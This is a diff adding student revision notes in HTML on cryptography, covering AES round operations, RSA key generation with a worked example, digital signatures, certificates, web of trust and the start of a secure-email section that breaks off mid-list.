+<p>The DES is now considered to be insecure due to the short key – it has been broken by brute-force methods.</p>
+
+<p>The <strong>AES</strong> is chosen as the new standard. Compared to DES it has a longer block size (128-bits), longer key (variable: 128, 192, or 256 bits) and faster implementation (only uses 1 S-box, while DES uses 8 distinct ones)</p>
+
+<p>Similar block cipher features but uses a substitution-permutation network (SPN) – <strong>mainly operations over matrices</strong> which is designed for more <strong>inherent parallelism</strong> and hence <strong>faster</strong>.</p>
+
+<h3 id="sub-operations">Sub-Operations</h3>
+
+<p>Encryption in AES uses 4 main operations. In the main rounds (not every round but most rounds) of encryption they are applied in the following order:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>input -&gt; SubBytes -&gt; ShiftRows -&gt; MixColumns -&gt; AddRoundKey -&gt; ouput
+</code></pre></div></div>
+
+<p>There are additional details, like the key scheduler for AES, which are not covered in the lectures and further reading can be done <a href="https://www.commonlounge.com/discussion/e32fdd267aaa4240a4464723bc74d0a5">here</a>. <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard#The_SubBytes_step">Wikipedia</a> is a good resource too.</p>
+
+<h4 id="subbytes">SubBytes</h4>
+
+<p>This involved splitting the input into bytes and passing each through a Substitution Box (S-box). Unlike the DES, the AES uses the same S-box for all bytes.</p>
+
+<p>Each byte from the input is replaced by a SubByte using an 8-bit substitution box (essentially a lookup table). Because we are dealing with a 128-bit block size, so each cell in the table is a byte (128/16 = 8).</p>
+
+<figure align="center">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/AES-SubBytes.svg" class="center" />
+        <figcaption style="text-align:center;">AES sub bytes, <a href="https://commons.wikimedia.org/wiki/File:AES-SubBytes.svg">Wikimedia Commons</a></figcaption>
+</figure>
+
+<h4 id="shiftrows">ShiftRows</h4>
+
+<p>Here, each row of the 128-bit internal state (input of <code class="language-plaintext highlighter-rouge">ShiftRows</code> which is output of <code class="language-plaintext highlighter-rouge">SubBytes</code>) of the cipher is shifted by a certain offset. In AES the top row is not shifted at all, the next row is shifted by 1 and 2 then 3 for the next two rows. This results in each column of the output state composed of bytes from each column of the input state.</p>
+
+<blockquote>
+  <p>This is important to avoid the columns being encrypted independently, because that would make AES into 4 independent block ciphers.</p>
+</blockquote>
+
+<figure align="center">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/66/AES-ShiftRows.svg" class="center" />
+        <figcaption style="text-align:center;">AES shift rows, <a href="https://commons.wikimedia.org/wiki/File:AES-ShiftRows.svg">Wikimedia Commons</a></figcaption>
+</figure>
+
+<h4 id="mixcolumns">MixColumns</h4>
+
+<p>Here the output matrix of the <code class="language-plaintext highlighter-rouge">ShiftRows</code> step is pre-multiplied with a fixed matrix – this helps with diffusion because if you change a<sub>0,1</sub> (even by 1-bit) the entire output column will change (as you know from matrix multiplication).</p>
+
+<figure align="center">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/76/AES-MixColumns.svg" class="center" />
+        <figcaption style="text-align:center;">AES mix columns, <a href="https://commons.wikimedia.org/wiki/File:AES-MixColumns.svg">Wikimedia Commons</a></figcaption>
+</figure>
+
+<h4 id="addroundkey">AddRoundKey</h4>
+
+<p>The only operation in AES that directly operates on the AES round key. In this operation, the input to the round is <strong>XORed</strong> with the round key.</p>
+
+<figure align="center">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/AES-AddRoundKey.svg" class="center" />
+        <figcaption style="text-align:center;">AES add round key, <a href="https://commons.wikimedia.org/wiki/File:AES-AddRoundKey.svg">Wikimedia Commons</a></figcaption>
+</figure>
+
+<h3 id="is-aes-secure">Is AES secure?</h3>
+
+<p>A computer that can break DES in 8 seconds will take 1.3 × 10<sup>15</sup> years to break AES-128.</p>
+
+<p>AES-256 can also provides post-quantum computing assurance.</p>
+
+
+            <br/>
+            <hr style="
+                padding: 5px;
+                border-radius: 1em;
+                background-color: whitesmoke;
+            ">
+            <br/><h1 id="public-key-cryptography">Public Key Cryptography</h1>
+       
+            <h2 id="congruence">Congruence</h2>
+
+<p>Two numbers \(a\) and \(b\) are called <strong>congruent</strong> if they have the same remainder when divided by an arbitrary third number \(n\). We write this as
+\(a \equiv b\ MOD\ n\)
+Congruence mod \(n\) forms \(n\) equivalence classes of values \([0; n-1]\) on the integer numbers, with each class having infinitely many elements, of the form \(\{c + kn\ \|\ \forall k \in \mathbb{Z}\}\), with \(c \in [0; n-1]\)</p>
+
+<h2 id="modular-arithmetic-identities">Modular arithmetic identities</h2>
+
+<p>The following are equivalent to each other:</p>
+
+\[\begin{matrix}
+(a + b)\ MOD\ n    &amp;\equiv &amp;((a\ MOD\ n) + b)\ MOD\ n     &amp;\equiv &amp;((a\ MOD\ n) + (b\ MOD\ n))\ MOD\ n \\\\
+(a \cdot b)\ MOD\ n &amp;\equiv &amp;((a\ MOD\ n) \cdot b)\ MOD\ n &amp;\equiv &amp;((a\ MOD\ n) \cdot (b\ MOD\ n))\ MOD\ n \\\\
+x^{ab}\ MOD\ n     &amp;\equiv &amp;(x^a\ MOD\ n)^b\ MOD\ n       &amp;\equiv &amp;(x^b\ MOD\ n)^a\ MOD\ n
+\end{matrix}\]
+
+<h2 id="one-way-function">One Way Function</h2>
+
+<blockquote>
+  <p>A o<strong>ne-way function</strong> is a function is easy to compute in one direction, but <strong>computationally infeasible</strong> to calculate in reverse.</p>
+
+  <p>In other words, given some inputs, it is easy to get the output, but given an output it is difficult to reverse the function to find the original input(s).</p>
+</blockquote>
+
+<p><strong>Example of 1 way functions.</strong></p>
+
+<ol>
+  <li>Modular exponentiation function (\(k = y^x \!\!\mod p\))</li>
+  <li>Prime factorisation (\(p\cdot q = n\), where \(p\) and \(q\) are large prime numbers).</li>
+</ol>
+
+<h2 id="the-primitive-root">The Primitive Root</h2>
+
+<blockquote>
+  <p>The function below is an example of a one-way function if</p>
+
+  <ul>
+    <li>\(y\) is the <strong>primitive root mod \(p\)</strong></li>
+    <li>\(p\) is an enormous number (e.g. 512-bits).</li>
+  </ul>
+
+\[k = y^x \!\!\!\mod p\]
+
+  <p>This is because if we try a value of \(x\) for a given \(k\), the probability that \(x\) is <strong>correct</strong> is \(\frac1{p-1}\) as the value of  \(k\) is equally likely to be any number in \([1, p - 1]\).</p>
+</blockquote>
+
+<p><strong>Conditions</strong> for \(y\) to be the “primitive root mod \(p\)”</p>
+
+<ol>
+  <li>Successive powers of \(y\) that takes \(\text{mod } p\) will generate results that loop from 1 to \(p - 1\).</li>
+  <li>The generated numbers \(k\) are distributed uniformly in the range of \([1, p - 1]\).</li>
+</ol>
+
+<h2 id="public-key-encryption">Public Key Encryption</h2>
+
+<blockquote>
+  <p>The problem with secret key encryption is that it takes a lot of <strong>effort</strong> to transfer the key safely. There are a few ways:</p>
+
+  <ul>
+    <li>Physical Transfer</li>
+    <li>Key Distribution Centre</li>
+    <li>Online transfer by breaking the key up to ensure security.</li>
+  </ul>
+</blockquote>
+
+<p>However, public key encryption provides a more <strong>elegant</strong> solution using a <strong>one-way function</strong> like the one <a href="#the-primitive-root">above</a>.</p>
+
+<p>The idea is that each communication party generates a pair of keys, one private and one public – KP<sub>a</sub> and KU<sub>a</sub> respectively where <em>a</em> represents one specific party/individual.</p>
+
+<ul>
+  <li>Sender of a message uses receiver’s public key to encrypt</li>
+  <li>Receiver uses their own private key to decrypt.</li>
+</ul>
+
+<h3 id="rsa-encryption">RSA Encryption</h3>
+
+<p align="center"><i>RSA is one of the oldest types of public key encryption schemes.</i></p>
+
+<p>Here we cover</p>
+<ol>
+  <li>How the public key is generated</li>
+  <li>How a message is encrypted</li>
+  <li>How a private key is generated</li>
+  <li>How to decrypt a message</li>
+</ol>
+
+<h4 id="how-to-generate-public-key">How to generate public key</h4>
+
+<p><strong>Firstly,</strong> choose 2 <strong>large secret prime numbers</strong>, \(p\) and \(q\), and calculate their product \(n = p \times q\). \(n\) is the <strong>public key</strong>.</p>
+
+<p><strong>Next,</strong> select another value \(e\), that is</p>
+
+<ul>
+  <li>relatively prime (coprime) to \(p-1\), \(q-1\), and \((p-1) \times (q-1)\).</li>
+  <li>and \(1 \lt e \lt (p-1)(q-1)\)</li>
+</ul>
+
+<h4 id="message-encryption">Message Encryption</h4>
+
+<p><strong>To encrypt a message</strong>, we use this formula 
+\(C = M^e\!\!\!\mod n\)
+where \(C\) is the ciphertext and \(M\) is the message.</p>
+
+<blockquote>
+  <p>If an eavesdropper gets \(C\), it is <strong>computationally infeasible</strong> to calculate \(M\).</p>
+</blockquote>
+
+<h4 id="how-to-generate-the-private-key">How to generate the private key</h4>
+
+<p>We find a number \(d\) such that</p>
+
+\[e \times d = 1 \!\!\!\mod ((p - 1)\cdot(q - 1))\]
+
+<p>Here, \(d\) is the private key owned by Alice and is called the multiplicative inverse of \(e \!\!\!\mod (p-1)(q-1)\).</p>
+
+<h5 id="how-do-we-find-d">How do we find <em>d</em>?</h5>
+
+<p>There is a formal method of finding the <a href="https://people.csail.mit.edu/rivest/Rsapaper.pdf">private key</a> (it’s a 15 page paper).</p>
+
+<p>Another way is by iteration. The goal is to find a multiple of \(e\), which is 1 greater than some multiple of \((p–1)(q–1)\). So iterate through the multiples of \((p–1)(q–1)\) and add 1, if that value is a multiple of \(e\) you have found a \(d\), otherwise continue to the next multiple.</p>
+
+<h4 id="ciphertext-decryption">Ciphertext Decryption</h4>
+
+<p><strong>To decrypt the ciphertext</strong>, we use the formula,
+\(M= C^d\!\!\!\mod n\)
+As you can see, it is very easy to decrypt the ciphertext given the private key. All that the receiver has to do is to keep the private key <strong>safe.</strong></p>
+
+<h4 id="example-of-rsa">Example of RSA</h4>
+
+<p>Let us take the two starting prime numbers as:
+\(p=11, q=3\)
+We can then find the public key \(n\) as their product:
+\(n = pq = 11 \times 3 = 33\)
+We can now select a value \(e\) which fulfils the properties of being relatively prime to \(10\), \(2\), and \(20\), and in the range \(1 &lt; e &lt; 20\), for example
+\(e = 7\)
+Then, we calculate the private key \(d\) from the equation:
+\(e \cdot d = 1\ MOD\ (p-1)(q-1)\)
+For which \(d=3\) is a valid solution, as \(7 \times 3 = 21 = 1\ MOD\ 20\). The easiest way to do this is just by trial and error</p>
+
+<p>Then, suppose we want to encrypt a message \(M=7\) using the public key, we can find the ciphertext \(C\) as:
+\(C = M^e\ MOD\ n
+= 7^7\ MOD\ 33 = 28\)
+This can then be decrypted using the secret key as:
+\(M = C^d\ MOD\ n = 28^3\ MOD\ 33 = 7\)</p>
+
+<h3 id="why-is-rsa-secure">Why is RSA secure?</h3>
+
+<p>To break RSA an attacker must</p>
+
+<ul>
+  <li>Either reverse the <strong>one-way function</strong> which is computationally difficult</li>
+  <li>Or know <strong><em>d</em></strong>, which means to know <strong><em>p and q</em></strong> which means to know <strong><em>n</em></strong> – but n = p × q is also a <strong>one-way function</strong>.</li>
+  <li>The only way is <strong>brute force</strong> – but a <strong>large enough key size</strong> will make this <strong>infeasible</strong>.</li>
+</ul>
+
+<blockquote>
+  <p>To match the security of a 256-bit secret key, the RSA key needs 15460-bits. RSA started with 512-bit public key, but now it is 2048-bits and will need to increase again to 3072-bits from 2030 onwards.</p>
+</blockquote>
+
+<p>Another implication of a longer key length, k, is encryption and decryption time increases as well</p>
+
+<ul>
+  <li>Encryption time = O(k<sup>2</sup>)</li>
+  <li>Decryption time = O(k<sup>3</sup>)</li>
+</ul>
+
+<h2 id="public-key-vs-secret-key-encryption">Public key vs Secret key Encryption</h2>
+
+<blockquote>
+  <p>DES is between 1000 and 10000 times faster than RSA (encryption &amp; decryption)</p>
+</blockquote>
+
+<table>
+  <thead>
+    <tr>
+      <th>Secret</th>
+      <th>Public</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Uses XOR, substitution, permutation – <strong>fast</strong></td>
+      <td>Uses a one-way function – <strong>slower</strong></td>
+    </tr>
+    <tr>
+      <td>Key is secret – attacker knows less information and hence requires shorter key for <strong>same</strong> level of security<br />It is <strong>faster</strong> to perform operations on a shorter key.</td>
+      <td>Only relies on the length of public key to prevent the crack with brute force<br />The longer the key the **slower **the operation.</td>
+    </tr>
+    <tr>
+      <td>Key distribution is <strong>complicated</strong></td>
+      <td>Key distribution is <strong>easy</strong></td>
+    </tr>
+  </tbody>
+</table>
+
+
+            <br/>
+            <hr style="
+                padding: 5px;
+                border-radius: 1em;
+                background-color: whitesmoke;
+            ">
+            <br/><h1 id="digital-signature--certificates">Digital Signature &amp; Certificates</h1>
+       
+            <h2 id="integrity-authentication--non-repudiation">Integrity, Authentication &amp; Non-repudiation</h2>
+
+<blockquote>
+  <p><strong>Symmetry of Public Key Encryption.</strong> We can encrypt and decrypt starting with the public key then the private key, or the other way around! This works according to the property 6 of modular arithmetic stated above.</p>
+</blockquote>
+
+<p>We encrypt with private keys for anyone and everyone to be able to decrypt because it provides</p>
+
+<ul>
+  <li><strong>Integrity.</strong> We don’t care about the privacy of the message, but we want to be sure that no one tampers with it</li>
+  <li><strong>Authentication.</strong> I want my receiver to know that the message definitely came from me.</li>
+  <li><strong>Non-repudiation.</strong> If someone sends a malicious message, the system will be able to identify who the owner of the public key is.</li>
+</ul>
+
+<p>To provide <strong>integrity</strong>, we send an encrypted message along with a plaintext message (remember we don’t care if people see the message, we just don’t want them to tamper with it.)</p>
+
+<blockquote>
+  <p>When our receiver decrypts the message, and <strong>compares the 2 messages</strong> (plaintext, and decrypted), if they are the same – <strong>integrity is guaranteed</strong>.</p>
+
+  <ul>
+    <li>This is because if someone tampers with our message, they <strong>don’t have the private key</strong> to encrypt the message they changed, so we will know if someone has tampered with the message.</li>
+    <li>They also have a <strong>low probability</strong> of being able to <strong>reverse the one-way function</strong> to re-encrypt the tampered message such that the tampered plaintext and tampered ciphertext is the same.</li>
+  </ul>
+</blockquote>
+
+<p>As a result if a ciphertext can be decrypted by my public key, it must mean that the message was encrypted by my private key and hence came from me. This ensures <strong>integrity</strong> and <strong>non-repudiation</strong>. This does not necessarily grant authentication and we will see why in the authentication protocols chapter.</p>
+
+<h2 id="digital-signatures-ds">Digital Signatures (DS)</h2>
+
+<p><strong>One problem however,</strong> encrypting an entire message may be <strong>costly</strong> (time-wise), for the purpose of integrity <strong>we don’t actually need to encrypt the entire message</strong>.</p>
+
+<blockquote>
+  <p>What we do is</p>
+
+  <ol>
+    <li>Calculate the hash of the message (also called digest)</li>
+    <li>Encrypt the hash using the private key. This will be our <strong>digital signature</strong>.</li>
+  </ol>
+
+  <p>Digital signatures are <strong>attached to plain text message</strong>, and are used to <strong>verify integrity</strong>.</p>
+
+  <p>The final message is: <strong>e + [hash(e)]<sub>ku</sub></strong></p>
+</blockquote>
+
+<p>On the receiver’s end, to <strong>verify integrity</strong>..</p>
+
+<ul>
+  <li>Use the sender’s public key to decrypt the digital signature to recover the hash.</li>
+  <li>Generate a hash of the received plaintext using the same hash algorithm used by the sender.</li>
+  <li>Compare the two hashes.</li>
+</ul>
+
+<blockquote class="extra">We often denote with square brackets, <b>[hash(e)]<sub>ku</sub></b>, that something is encrypted and the subscript states whether it is a private (u) or public (p) key.</blockquote>
+
+<h3 id="differences-between-encryption-and-ds">Differences between Encryption and DS</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Encryption Scheme</th>
+      <th>Digital Signature</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Maintains confidentiality</td>
+      <td>Provide integrity check, authentication, and non-repudiation</td>
+    </tr>
+    <tr>
+      <td>Can recover plaintext</td>
+      <td>Cannot recover plaintext</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="message-authentication-code-mac">Message Authentication Code (MAC)</h2>
+
+<p>Another way of providing integrity</p>
+
+<blockquote>
+  <p>The hash of an input file is computed and encrypted using a shared secret key.</p>
+</blockquote>
+
+<p>This can <strong>guarantee integrity</strong> but <strong>cannot provide non-repudiation</strong></p>
+
+<ul>
+  <li>because MAC is created with the secret key</li>
+  <li>Secret key is <strong>shared</strong> by more than one party</li>
+</ul>
+
+<h3 id="why-mac">Why MAC?</h3>
+
+<p>MAC is used because it is much faster than DS as it uses secret key encryption instead of public.</p>
+
+<ul>
+  <li><strong>Recall</strong> secret key uses XOR, shift etc.</li>
+  <li>Public key encryption uses modular exponentiation which takes more time to compute.</li>
+</ul>
+
+<h2 id="digital-certificates-ca">Digital Certificates (CA)</h2>
+
+<p>Digital certificates are provided by a trusted 3rd party called the <strong>Certificate Authority</strong>. These certify that a public key indeed belongs to somebody.</p>
+
+<blockquote>
+  <p>X.509 cert format is used to compose certificates which includes</p>
+
+  <ul>
+    <li>Subject: <strong>distinguished name</strong> of the user</li>
+    <li>Subject’s public key</li>
+    <li>Certificate Authority’s subject</li>
+    <li>Digital signature of CA</li>
+  </ul>
+</blockquote>
+
+<p>The format of the distinguished name is</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O=University of Warwick, 
+OU=Department of Computer Science, 
+CN=Ligang He 
+</code></pre></div></div>
+
+<p>(O: organisation, OU: Organisation Unit, CN: Common Name)</p>
+
+<h3 id="authentication-through-certificates">Authentication through certificates</h3>
+
+<ol>
+  <li>A asks for B’s certificate, and B sends it over.</li>
+  <li>A uses the CA’s public key to verify B’s certificate.</li>
+  <li>If B’s certificate is genuine, B’s public key contained in B’s certificate is genuine.</li>
+</ol>
+
+<p>This is one way authentication, where A <strong>can authenticate</strong> B’s identity.</p>
+
+<p><img src=".\part6.assets\authenticationWithCertificates.png" alt="authenticationWithCertificates" /></p>
+
+<h3 id="strong-authentication-with-certificate">Strong Authentication with Certificate</h3>
+
+<ol>
+  <li>A’s cert proves that public key belongs to A</li>
+  <li>Use A’s public key to verify the message is really signed by A’s private key</li>
+  <li>If so, the message must come from A</li>
+</ol>
+
+<p><img src=".\part6.assets\strongAuthenticationWithCertificates.png" alt="strongAuthenticationWithCertificates" /></p>
+
+<h3 id="authentication-chain">Authentication Chain</h3>
+
+<blockquote>
+  <p>In addition to issuing certs to users, CA can also set up a sub-CA e.g. CA sets up CA1</p>
+
+  <ul>
+    <li>CA1 can also issue certs to users</li>
+    <li>The certs issued by CA1 are signed by CA1</li>
+    <li>CA1 also issues a root cert to itself</li>
+  </ul>
+</blockquote>
+
+<p><img src=".\part6.assets\authenticationChains.png" alt="authenticationChains" /></p>
+
+<p><strong>Using the authentication chain</strong></p>
+
+<ol>
+  <li>A sends A’s DC and CA1’s DC to B</li>
+  <li>B uses CA’s public key to verify CA1’s DC</li>
+  <li>B uses CA1’s public key to verify A’s DC</li>
+  <li>B uses A’s public key to verify the integrity of the signed message</li>
+</ol>
+
+<h2 id="web-of-trust">Web of Trust</h2>
+
+<p>There is <strong>no centralised certificate authority</strong> (CA). Each user establishes their personal web of trust</p>
+
+<ul>
+  <li>Each user <strong>creates a cert</strong> and <strong>can sign</strong> other users’ cert</li>
+</ul>
+
+<p>There are 2 attributes about a user. <strong>Validity</strong> and <strong>Trust.</strong></p>
+
+<blockquote>
+  <p><strong>Validity</strong> indicates the <strong>confidence</strong> others have that a certain user’s public key <strong>actually</strong> belongs to them.</p>
+
+  <p><strong>Trust</strong> indicates the <strong>confidence</strong> others have that a certain user is <strong>careful</strong> when signing other users’ certificates.</p>
+</blockquote>
+
+<p>Users can rate validity and trust of another user as <strong>unknown</strong>, <strong>marginal</strong>, <strong>full</strong>, or <strong>ultimate</strong>.</p>
+
+<h3 id="how-is-validity-determined">How is validity determined?</h3>
+
+<p>Validity between a user A and C is determined by 4 main factors</p>
+
+<ul>
+  <li>Threshold distance</li>
+  <li>Validity and Trust score</li>
+  <li>Number of users trusted</li>
+  <li>Number of valid users</li>
+</ul>
+
+<p><strong>Example</strong></p>
+
+<div class="language-haskell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">A</span> <span class="o">-&gt;</span> <span class="kt">B</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">full</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kt">C</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">full</span><span class="p">)</span> <span class="o">=</span> 
+<span class="kt">A</span> <span class="o">-&gt;</span> <span class="kt">C</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">full</span><span class="p">)</span> <span class="err">✅</span>
+<span class="c1">-- VS --</span>
+<span class="kt">A</span> <span class="o">-&gt;</span> <span class="kt">B</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">marginal</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kt">C</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">full</span><span class="p">)</span> <span class="o">=</span> 
+<span class="kt">A</span> <span class="o">-&gt;</span> <span class="kt">C</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">marginal</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">marginal</span><span class="p">)</span> <span class="err">❌</span>
+<span class="c1">-- VS --                 </span>
+<span class="kt">A</span> <span class="o">-&gt;</span> <span class="kt">B1</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">marginal</span><span class="p">)</span> <span class="o">-</span>
+  <span class="o">-&gt;</span> <span class="kt">B2</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">marginal</span><span class="p">)</span> <span class="o">--&gt;</span> <span class="kt">C</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">full</span><span class="p">)</span> <span class="err">✅</span>
+  <span class="o">-&gt;</span> <span class="kt">B3</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">marginal</span><span class="p">)</span> <span class="o">-</span>
+<span class="c1">--                            ^ This indicates that all B1, B2, B3 point to C</span>
+</code></pre></div></div>
+
+<p>User C’s key is considered valid by user A if the key has been signed</p>
+
+<ul>
+  <li>by at least one user with “full” trust set by A</li>
+  <li>by at least <strong><em>n</em></strong> users with “marginal” trust set by A, where <strong><em>n</em></strong> is predefined in the web of trust scheme.</li>
+</ul>
+
+<p><strong>Further example</strong></p>
+
+<div class="language-haskell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">A</span> <span class="o">-&gt;</span> <span class="kt">B1</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">full</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kt">B2</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">full</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kt">B3</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">full</span><span class="p">)</span> 
+<span class="o">-&gt;</span> <span class="kt">C</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">full</span><span class="p">)</span> <span class="o">=</span>
+<span class="kt">A</span> <span class="o">-&gt;</span> <span class="kt">C</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">marginal</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">full</span><span class="p">)</span> <span class="err">❌</span>
+<span class="c1">-- VS --</span>
+<span class="kt">A</span> <span class="o">-&gt;</span> <span class="kt">B1</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">ultimate</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kt">B2</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">ultimate</span><span class="p">)</span> 
+<span class="o">-&gt;</span> <span class="kt">B3</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">ultimate</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kt">C</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">ultimate</span><span class="p">)</span> <span class="o">=</span>
+<span class="kt">A</span> <span class="o">-&gt;</span> <span class="kt">C</span><span class="p">(</span><span class="kt">V</span><span class="o">:</span> <span class="n">full</span><span class="p">,</span> <span class="kt">T</span><span class="o">:</span> <span class="n">ultimate</span><span class="p">)</span> <span class="err">✅</span>
+</code></pre></div></div>
+
+<p>In the first example even if all users are of full trust on the chain from A to C, C’s key is not considered valid by A if the distance (number of arrows/links) between the 2 users is bigger than a pre-set threshold (i.e 4).</p>
+
+<blockquote>
+  <p><strong>However</strong>, if the trust level is ultimate throughout, it breaks the restriction of threshold distance.</p>
+</blockquote>
+
+<p><img src=".\part6.assets\webOfTrust.png" alt="webOfTrust" /></p>
+
+<h2 id="summary--ca-vs-wot">Summary – CA vs WoT</h2>
+
+<p><em>Certificate Authority vs Web of Trust</em></p>
+
+<p>CA is a centralised third party that issues <strong>digital certificates</strong> to users or other CAs. These CAs are assumed to be reputable and trustworthy. If an authentication chain can be established from a CA to a particular certificate, then the trustworthiness of the certificate is assumed.</p>
+
+<p>Contrastingly, the Web of Trust requires a chain of signatures to be established from each user to the certificate in question, each user acting his own Authority. Users can rate the <strong>validity</strong> and <strong>trustworthiness</strong> of other users, and this along with other parameters like the authentication chain length, number of separate chains affect the final score of a particular certificate. This final score determines if it should be trusted or not. This usually relies on personal knowledge of other users, and it should be people they know personally or otherwise have verified the identity of offline.</p>
+
+<blockquote>
+  <p><strong>Disclaimer.</strong> Some information here were not directly sourced from the notes and if anything seems “wrong” then please submit a pull request to fix it! <a href="https://andrewgdotcom.wordpress.com/2014/11/13/wot-ca/#:~:text=An%20Authority%20is%20a%20person,both%20well%2Dknown%20and%20trustworthy.&amp;text=By%20contrast%2C%20a%20Web%20of,acting%20as%20his%20own%20Authority.">Main source</a> I referred to. (yes it’s a wordpress blog, idk how reliable it is but seems to match whatever is covered in the lectures.)</p>
+</blockquote>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">CAs</th>
+      <th style="text-align: center">WoT</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">More convenient for the end user because CA are assumed to be trustworthy.</td>
+      <td style="text-align: center">Less convenient for end users as they have to continually assess the reliability of certificates.</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">If one CA certificate is compromised, the attacker can impersonate any site on the internet as all CAs have the authority to sign any certificate.</td>
+      <td style="text-align: center">Integrity of the WoT depends on how well-maintained it is by its users.</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">Usually one authentication chain for any certificate, so every chain has a single point of failure.</td>
+      <td style="text-align: center">Usually has multiple signature chains for one certificate. With more chains, a particular certificate is more trustworthy.</td>
+    </tr>
+  </tbody>
+</table>
+
+
+            <br/>
+            <hr style="
+                padding: 5px;
+                border-radius: 1em;
+                background-color: whitesmoke;
+            ">
+            <br/><h1 id="secure-email">Secure Email</h1>
+       
+            <blockquote>
+  <p>According to the <strong>Revision Lecture</strong>, the main concepts to know for the exams in this section is <strong><a href="#interception">PGP encryption</a></strong>.</p>
+</blockquote>
+
+<p><strong><em>Some terminology.</em></strong></p>
+
+<ul>
+  <li><strong>Email domain:</strong> Warwick domain, cambridge domain, google domain. e.g. “@warwick.ac.uk”</li>
+  <li><strong>Email client</strong>: Thunderbird, Outlook etc.</li>
+  <li><strong>Email Servers:</strong>
+    <ul>
+      <li>SMTP – responsible for sending email to their 	destinations</li>
+      <li>IMAP or PoP3 servers – responsible for retrieving emails sent by the sender.</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="how-email-is-delivered">How email is delivered</h2>
+
+<ol>
+  <li>User begins by using the <strong>email client</strong>, which connects to the SMTP server and sends the server the email address of the recipient, the name of the sender, and the body of the message.
+    <ul>
+      <li>SMTP breaks down the recipient’s email into 2 parts: the name (before the @) and the domain (after the @)</li>
+    </ul>
+  </li>
+  <li>If the domain of recipient and sender are <strong>identical</strong>, the SMTP server hands the message to the PoP3 or IMAP server for that particular domain.</li>
+  <li>Otherwise, SMTP communicates with the Domain Name Server (DNS) for the IP address of the SMTP server in the other domain.</li>
+  <li>The SMTP server at the senders side sends the email message to the SMTP server at the recipient’s end, which then hands the message to the PoP3 server for the recipient’s domain.</li>
+</ol>
+
+<blockquote>
+  <p>If SMTP server cannot connect to the other SMTP server, the message goes into a <strong>sendmail queue</strong>.</p>
+
+  <ul>
+    <li>The server will periodically try to resend messages in the queue.</li>
+    <li>After several failures, the server will give up and return the mail undelivered.</li>
+  </ul>
+</blockquote>
+
+<p>The PoP3 server for each domain maintains a list of email accounts and a text file for each account.</p>
+
+<ul>
+  <li>When the server receives an email addressed to someone, it formats the email and appends the formatted email to the account’s text file.</li>
+  <li>When the recipient checks their email with the email client, the email client
+    <ul>
